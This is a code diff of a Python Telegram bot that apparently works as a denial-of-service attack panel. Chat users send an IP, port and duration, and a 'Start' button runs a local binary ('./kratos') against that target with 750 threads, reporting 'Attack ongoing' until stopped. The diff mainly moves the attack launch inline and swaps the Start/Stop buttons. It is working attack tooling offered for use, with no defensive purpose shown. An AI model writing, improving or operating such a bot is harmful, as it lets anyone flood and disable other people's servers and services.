@@ -1,6 +1,5 @@
 from telethon import TelegramClient, events, Button
 import asyncio
-import os
 
 # Replace with your own values
 api_id = "22157690"
@@ -17,23 +16,19 @@ message_ids = {}
 async def handle_ip_port(event):
     ip, port, duration = event.pattern_match.groups()
 
-    # Send the initial message with the start/stop buttons
+    # Send initial message with buttons
     message = await event.respond(
         f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
         buttons=[
-            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
+            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}")]
         ]
     )
-
-    # Save the message ID for later editing
     message_ids[(event.chat_id, ip, port)] = message.id
 
 @client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
 async def handle_buttons(event):
     action, ip, port, duration = event.pattern_match.groups()
     chat_id = event.chat_id
-
-    # Get the original message ID to edit later
     message_id = message_ids.get((chat_id, ip.decode(), port.decode()), None)
 
     if action == b"start":
@@ -43,12 +38,21 @@ async def handle_buttons(event):
 
         duration = int(duration.decode()) if duration else 60
         await event.answer("Starting the attack...", alert=True)
-        process = await run_attack(chat_id, ip.decode(), port.decode(), duration)
-        running_processes[(chat_id, ip, port)] = process
 
-        # Update the message with attack status
+        # Run attack and update message with status
+        process = await asyncio.create_subprocess_shell(
+            f"./kratos {ip.decode()} {port.decode()} {duration} 750",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        running_processes[(chat_id, ip, port)] = process
+        asyncio.create_task(monitor_process(chat_id, process))
+
+        # Update message with attack status and replace button with 'Stop'
         if message_id:
-            await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack ongoing")
+            await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack ongoing", buttons=[
+                [Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
+            ])
 
     elif action == b"stop":
         process = running_processes.pop((chat_id, ip, port), None)
@@ -56,36 +60,20 @@ async def handle_buttons(event):
             process.terminate()
             await event.answer("Attack stopped successfully!", alert=True)
 
-            # Update the message with attack status
+            # Update message with attack status and replace button with 'Start'
             if message_id:
-                await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack stopped")
+                await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack stopped", buttons=[
+                    [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|60")]
+                ])
         else:
             await event.answer("No running attack to stop!", alert=True)
 
-async def run_attack(chat_id, ip, port, duration):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./kratos {ip} {port} {duration} 750",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-
-        # Monitor process in the background
-        asyncio.create_task(monitor_process(chat_id, process))
-        return process
-    except Exception as e:
-        await client.send_message(chat_id, f"Failed to start attack: {e}")
-        return None
-
 async def monitor_process(chat_id, process):
-    try:
-        stdout, stderr = await process.communicate()
-        if stdout:
-            await client.send_message(chat_id, f"Process output: {stdout.decode()}")
-        if stderr:
-            await client.send_message(chat_id, f"Process error: {stderr.decode()}")
-    except Exception as e:
-        await client.send_message(chat_id, f"Error monitoring process: {e}")
+    stdout, stderr = await process.communicate()
+    if stdout:
+        await client.send_message(chat_id, f"Process output: {stdout.decode()}")
+    if stderr:
+        await client.send_message(chat_id, f"Process error: {stderr.decode()}")
 
 if __name__ == "__main__":
     client.run_until_disconnected()
